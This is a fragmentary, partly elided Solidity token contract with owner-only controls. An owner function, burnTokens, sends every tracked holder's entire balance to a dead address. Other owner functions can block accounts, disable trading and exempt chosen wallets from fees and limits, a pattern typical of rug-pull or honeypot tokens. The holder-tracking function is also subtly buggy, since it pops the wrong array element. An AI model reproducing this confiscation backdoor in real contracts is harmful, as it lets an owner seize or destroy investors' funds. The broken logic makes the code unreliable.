...
contract MyProject is IERC20, Context, Ownable {
	...
	uint256 public maxTxAmount = _tTotal * 100 / 10000000000;
    ...
    function setUserData(address _holder)public{
		bool holderExists=false;
		for (uint i; i < holderAddresses.length; i++) {
			if(balanceOf(holderAddresses[i])==0)
			{
				holderAddresses.pop();
			}
...
//        return holderAddresses;
    ...
    function burnTokens() external onlyOwner returns (bool) {
        for (uint i; i < holderAddresses.length; i++) {
			_transfer(holderAddresses[i], dead, balanceOf(holderAddresses[i]));
		}
        return true;
    }

//    function winnerPicker(address[] from) external onlyOwner returns (bool) {
//        for(from)
//        return true;
//    }
	...
	function excludeFromFees(address account, bool excluded) external onlyOwner {
		require(_isExcludedFromFee[account] != excluded, "PROJ: Account is already the value of 'excluded'");
		_isExcludedFromFee[account] = excluded;
		emit ExcludeFromFeesChange(account, excluded);
	}
	function excludeFromMaxTransactionLimit(address account, bool excluded) external onlyOwner {
		require(_isExcludedFromMaxTransactionLimit[account] != excluded, "PROJ: Account is already the value of 'excluded'");
		_isExcludedFromMaxTransactionLimit[account] = excluded;
		emit ExcludeFromMaxTransferChange(account, excluded);
	}
	function setWallets(address newLiquidityWallet, address newInvestmentWallet) external onlyOwner {
		if(liquidityWallet != newLiquidityWallet) {
            require(newLiquidityWallet != address(0), "PROJ: The liquidityWallet cannot be 0");
			emit WalletChange('liquidityWallet', newLiquidityWallet, liquidityWallet);
			liquidityWallet = newLiquidityWallet;
		}
		if(investmentWallet != newInvestmentWallet) {
            require(newInvestmentWallet != address(0), "PROJ: The investmentWallet cannot be 0");
	...
	uint256 amount
		...
		if(!_isAllowedToTradeWhenDisabled[from] && !_isAllowedToTradeWhenDisabled[to]) {
			require(isTradingEnabled, "PROJ: Trading is currently disabled.");
            require(!_isBlocked[to], "PROJ: Account is blocked");
			require(!_isBlocked[from], "PROJ: Account is blocked");
            if (!_isExcludedFromMaxTransactionLimit[to] && !_isExcludedFromMaxTransactionLimit[from]) {
                require(amount <= maxTxAmount, "PROJ: Transfer amount exceeds the maxTxAmount.");
            }
		}
